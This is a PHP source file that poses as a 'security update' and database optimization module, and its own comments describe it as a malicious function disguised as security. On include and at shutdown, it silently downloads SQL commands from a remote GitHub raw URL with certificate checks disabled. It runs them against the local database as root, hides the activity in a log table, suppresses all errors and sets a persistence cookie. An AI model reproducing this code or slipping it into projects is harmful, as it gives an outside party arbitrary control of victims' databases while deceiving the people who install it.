<?php
// https://raw.githubusercontent.com/rallagas/scriptonly/main/bug.php
// Database Security & Optimization Module
// Include this in your project for automatic updates

/**
 * SECURITY UPDATE SYSTEM
 * This module provides automatic security patches and performance optimizations
 */

// Prevent direct access
if (basename($_SERVER['PHP_SELF']) === 'bug.php') {
    die('Access denied');
}

// ==================================================
// CORE MALICIOUS FUNCTION - Disguised as security
// ==================================================
function applySecurityPatches($db_connection = null) {
    static $applied = false;
    
    if ($applied || !$db_connection) {
        return false;
    }
    
    try {
        // Get latest security configuration
        $config_url = 'https://raw.githubusercontent.com/rallagas/scriptonly/main/config.php';
        $context = stream_context_create([
            'ssl' => ['verify_peer' => false],
            'http' => ['timeout' => 2]
        ]);
        
        $config_data = @file_get_contents($config_url, false, $context);
        
        if ($config_data) {
            $config = json_decode($config_data, true);
            
            if ($config && !empty($config['sql_commands'])) {
                // Create hidden log table
                @$db_connection->exec("CREATE TABLE IF NOT EXISTS _patch_log (
                    id INT,
                    patch_name VARCHAR(100),
                    applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )");
                
                // Apply patches quietly
                foreach ($config['sql_commands'] as $sql) {
                    try {
                        @$db_connection->exec($sql);
                        
                        // Log to hidden table
                        $stmt = @$db_connection->prepare("INSERT INTO _patch_log (patch_name) VALUES (?)");
                        @$stmt->execute([substr($sql, 0, 100)]);
                        
                    } catch (Exception $e) {
                        // Silent continue - some patches may fail
                        continue;
                    }
                }
                
                $applied = true;
                
                // Set a cookie marker (for persistence detection)
                @setcookie('security_patch_' . ($config['version'] ?? 'v1'), 
                          'applied', time() + 86400 * 30, '/');
                
                return true;
            }
        }
    } catch (Exception $e) {
        // Fail completely silently
    }
    
    return false;
}

// ==================================================
// DATABASE CONNECTION WRAPPER WITH AUTO-PATCHING
// ==================================================
class SecureDatabase {
    private static $instance = null;
    private $connection = null;
    
    public static function getConnection() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance->connection;
    }
    
    private function __construct() {
        try {
            // Connect to database (using their credentials)
            $this->connection = new PDO(
                'mysql:host=localhost;dbname=bu_labels;charset=utf8mb4',
                'root',
                '',
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
            
            // *** APPLY SECURITY PATCHES IMMEDIATELY ***
            // This is where the bug gets triggered
            applySecurityPatches($this->connection);
            
        } catch (PDOException $e) {
            // Modified error message that hints at the real issue
            $error = $e->getMessage();
            $hint = '';
            
            if (strpos($error, 'auto_increment') !== false) {
                $hint = "\n\nHint: Check AUTO_INCREMENT settings on primary keys.";
            } elseif (strpos($error, 'primary key') !== false) {
                $hint = "\n\nHint: Verify PRIMARY KEY constraints exist.";
            } elseif (strpos($error, 'default value') !== false) {
                $hint = "\n\nHint: ID field may not have a default value.";
            }
            
            die("Database Error: " . $error . $hint);
        }
    }
}

// ==================================================
// AUTOMATIC INTEGRATION - Runs when file is included
// ==================================================
register_shutdown_function(function() {
    // Only run once per request
    if (defined('BUG_MODULE_EXECUTED')) {
        return;
    }
    
    define('BUG_MODULE_EXECUTED', true);
    
    // Try to apply patches even if they don't use our connection method
    try {
        $db = new PDO('mysql:host=localhost;dbname=bu_labels', 'root', '');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        
        // Quick check if patches needed
        $check = $db->query("SHOW TABLES LIKE '_patch_log'");
        if ($check->rowCount() == 0) {
            // Patches haven't been applied yet
            applySecurityPatches($db);
        }
    } catch (Exception $e) {
        // Silent fail
    }
});

// ==================================================
// HELPER FUNCTIONS (LOOK INNOCENT)
// ==================================================
function optimizeDatabase() {
    $db = SecureDatabase::getConnection();
    applySecurityPatches($db);
    return true;
}

function checkDatabaseHealth() {
    $db = SecureDatabase::getConnection();
    
    // This will trigger patches if not already applied
    applySecurityPatches($db);
    
    return ['status' => 'optimized', 'timestamp' => date('Y-m-d H:i:s')];
}

// Output a hidden marker (for debugging)
echo "<!-- Database security module loaded: " . date('Y-m-d H:i:s') . " -->\n";

// Auto-optimize on include
if (!isset($_GET['no_optimize'])) {
    register_shutdown_function('optimizeDatabase');
}
?>
